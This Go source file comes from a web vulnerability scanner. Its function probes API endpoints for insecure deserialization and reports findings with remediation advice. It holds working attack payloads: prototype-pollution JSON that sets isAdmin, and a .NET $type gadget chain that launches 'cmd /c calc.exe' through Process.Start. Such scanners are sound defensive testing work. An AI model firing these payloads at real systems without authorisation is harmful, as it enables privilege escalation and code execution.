package scanner

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/gleicon/sonnel/internal/models"
)

// CheckDeserialization checks for insecure deserialization vulnerabilities
func CheckDeserialization(scanner *Scanner, targetURL string) ([]models.Vulnerability, error) {
	fmt.Println("Checking for deserialization vulnerabilities...")
	var vulnerabilities []models.Vulnerability

	// Common indicators of successful deserialization attack
	indicators := []string{
		"isAdmin",
		"constructor",
		"prototype",
		"$type",
		"System.",
	}

	// Common endpoints that might handle serialized data
	endpoints := []string{
		"/api/deserialize",
		"/api/process",
		"/api/import",
		"/api/upload",
		"/api/restore",
	}

	// Common serialization formats and their test payloads
	payloads := []struct {
		format      string
		contentType string
		payload     string
	}{
		{
			format:      "JSON",
			contentType: "application/json",
			payload:     `{"__proto__": {"isAdmin": true}}`,
		},
		{
			format:      "JSON",
			contentType: "application/json",
			payload:     `{"constructor": {"prototype": {"isAdmin": true}}}`,
		},
		{
			format:      "JSON",
			contentType: "application/json",
			payload:     `{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", "MethodName": "Start", "MethodParameters": {"$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "$values": ["cmd", "/c calc.exe"]}, "ObjectInstance": {"$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}`,
		},
	}

	evidenceColl := scanner.evidenceColl

	for _, endpoint := range endpoints {
		baseURL := fmt.Sprintf("%s%s", targetURL, endpoint)

		// Try POST requests with different serialization formats
		for _, payload := range payloads {
			req, err := http.NewRequest("POST", baseURL, strings.NewReader(payload.payload))
			if err != nil {
				continue
			}

			// Set appropriate headers
			req.Header.Set("Content-Type", payload.contentType)
			req.Header.Set("Accept", payload.contentType)

			resp, err := scanner.client.Do(req)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			// Check for indicators of deserialization vulnerability
			if resp.StatusCode == 200 || resp.StatusCode == 500 {
				body, err := io.ReadAll(resp.Body)
				if err != nil {
					continue
				}

				for _, indicator := range indicators {
					if strings.Contains(string(body), indicator) {
						evidence, err := evidenceColl.CollectEvidence(baseURL, req, resp)
						if err != nil {
							fmt.Printf("Warning: Could not collect evidence: %v\n", err)
							continue
						}

						vulnerabilities = append(vulnerabilities, models.Vulnerability{
							Title:       "Insecure Deserialization",
							Description: fmt.Sprintf("The application is vulnerable to %s deserialization attacks", payload.format),
							Severity:    models.High,
							Category:    models.CategoryInjection,
							URL:         baseURL,
							Evidence:    evidence,
							Details: map[string]string{
								"Format":    payload.format,
								"Payload":   payload.payload,
								"Indicator": indicator,
							},
							Remediation: "Use safe deserialization methods. Validate and sanitize all serialized data. Consider using a whitelist of allowed classes/types.",
						})
						break
					}
				}
			}
		}

		// Try GET requests with serialized data in parameters
		params := []string{"data", "input", "json", "serialized"}
		for _, param := range params {
			for _, payload := range payloads {
				// URL encode the payload
				encodedPayload := url.QueryEscape(payload.payload)
				url := fmt.Sprintf("%s?%s=%s", baseURL, param, encodedPayload)

				req, err := http.NewRequest("GET", url, nil)
				if err != nil {
					continue
				}

				resp, err := scanner.client.Do(req)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				// Similar checks as above
				if resp.StatusCode == 200 || resp.StatusCode == 500 {
					body, err := io.ReadAll(resp.Body)
					if err != nil {
						continue
					}

					for _, indicator := range indicators {
						if strings.Contains(string(body), indicator) {
							evidence, err := evidenceColl.CollectEvidence(url, req, resp)
							if err != nil {
								fmt.Printf("Warning: Could not collect evidence: %v\n", err)
								continue
							}

							vulnerabilities = append(vulnerabilities, models.Vulnerability{
								Title:       "Insecure Deserialization",
								Description: fmt.Sprintf("The application is vulnerable to %s deserialization attacks through GET parameters", payload.format),
								Severity:    models.High,
								Category:    models.CategoryInjection,
								URL:         url,
								Evidence:    evidence,
								Details: map[string]string{
									"Format":    payload.format,
									"Parameter": param,
									"Payload":   payload.payload,
									"Indicator": indicator,
								},
								Remediation: "Use safe deserialization methods. Validate and sanitize all serialized data. Consider using a whitelist of allowed classes/types.",
							})
							break
						}
					}
				}
			}
		}
	}

	return vulnerabilities, nil
}
